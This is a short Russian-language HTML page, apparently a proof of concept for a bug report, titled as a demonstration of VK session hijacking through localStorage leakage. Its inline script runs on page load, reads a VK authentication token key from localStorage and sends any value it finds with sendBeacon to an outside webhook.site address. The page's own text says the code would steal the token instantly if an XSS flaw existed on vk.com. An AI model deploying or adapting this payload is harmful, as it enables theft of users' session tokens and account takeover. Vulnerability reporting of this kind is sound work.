<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Взлом сессии VK</title>
</head>
<body style="font-family: sans-serif; text-align: center; padding: 50px;">
    <h1>Демонстрация уязвимости LocalStorage Leakage</h1>
    <p>Если бы это был вредоносный сайт, ваш токен уже был бы украден.</p>
    
    <script>
        // Имитируем ситуацию: если пользователь открыл этот сайт, 
        // а злоумышленник нашел XSS на любом поддомене VK (например, dev.vk.com или в приложении)
        // Токен достается одной строчкой кода:
        
        try {
            const stolenData = localStorage.getItem('6287487:web_token:login:auth');
            if (stolenData) {
                // Отправка на твой вебхук
                navigator.sendBeacon('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661', stolenData);
                document.body.innerHTML += '<h2 style="color:red;">ТОКЕН ПЕРЕХВАЧЕН И ОТПРАВЛЕН!</h2>';
                console.log("Данные ушли на вебхук");
            } else {
                document.body.innerHTML += '<p>Токен не найден в этом домене. (Это ожидаемо, так как браузер изолирует localStorage разных сайтов).</p>';
                document.body.innerHTML += '<p><b>Для отчета:</b> укажите, что при наличии XSS внутри vk.com, этот код крадет данные мгновенно.</p>';
            }
        } catch (e) {
            console.error(e);
        }
    </script>
</body>
</html>
